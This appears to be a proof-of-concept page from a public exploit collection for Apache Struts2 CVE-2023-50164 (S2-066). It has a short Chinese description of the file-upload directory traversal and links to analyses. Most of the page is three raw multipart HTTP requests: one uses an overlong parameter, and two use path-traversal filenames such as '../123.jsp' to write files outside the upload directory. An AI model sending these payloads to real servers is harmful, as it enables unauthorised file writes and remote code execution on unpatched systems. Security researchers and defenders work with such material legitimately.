## Apache Struts2 CVE-2023-50164

漏洞描述里提到可通过伪造文件上传的参数导致目录穿越，看版本比对，有两个 Commit 引起我的关注，一个是 Always delete uploaded file，另一个是 Makes HttpParameters case-insensitive。前者的作用是确保上传的临时文件被正确上传，在修复之前，通过构造超长的文件上传参数可以让临时文件继续留存在磁盘中；

## 漏洞复现分析
- https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)
- https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/
  
## poc
```
POST /s2_066_war_exploded/upload.action HTTP/1.1
Host: localhost:8080
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5WJ61X4PRwyYKlip
Content-Length: 593
 
------WebKitFormBoundary5WJ61X4PRwyYKlip
Content-Disposition: form-data; name="upload"; filename="poc.txt"
Content-Type: text/plain
 
test
 
 
------WebKitFormBoundary5WJ61X4PRwyYKlip
Content-Disposition: form-data; name="caption";
 
 
{{randstr(4097,4097)}}
 
------WebKitFormBoundary5WJ61X4PRwyYKlip--
```


```
POST /s2_066_war_exploded/upload.action HTTP/1.1
Host: localhost:8080
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5WJ61X4PRwyYKlip
Content-Length: 593
 
------WebKitFormBoundary5WJ61X4PRwyYKlip
Content-Disposition: form-data; name="upload"; filename="poc.txt"
Content-Type: text/plain
 
test
 
 
------WebKitFormBoundary5WJ61X4PRwyYKlip
Content-Disposition: form-data; name="uploadFileName";
 
../../poc.txt
 
------WebKitFormBoundary5WJ61X4PRwyYKlip--

```

```
POST /untitled4_war_exploded/upload.action HTTP/1.1
Host: localhost:8080
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------299952630938737678921373326300
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Sec-Fetch-Mode: navigate
Origin: http://localhost:8080
Sec-Fetch-Dest: document
Cookie: JSESSIONID=4519C8974359B23EE133A5CEA707D7D0; USER_NAME_COOKIE=admin; SID_1=69cf26c6
Referer: http://localhost:8080/untitled4_war_exploded/
Content-Length: 63765

-----------------------------299952630938737678921373326300
Content-Disposition: form-data; name="Upload"; filename="12.txt"
Content-Type: image/png

111
-----------------------------299952630938737678921373326300
Content-Disposition: form-data; name="uploadFileName"; 
Content-Type: text/plain

../123.jsp
-----------------------------299952630938737678921373326300--
```
![image](https://github.com/wy876/POC/assets/139549762/afd588e7-f552-46bf-a2de-6c568d0fc1a2)

- https://blog.csdn.net/qq_18193739/article/details/134935865
  
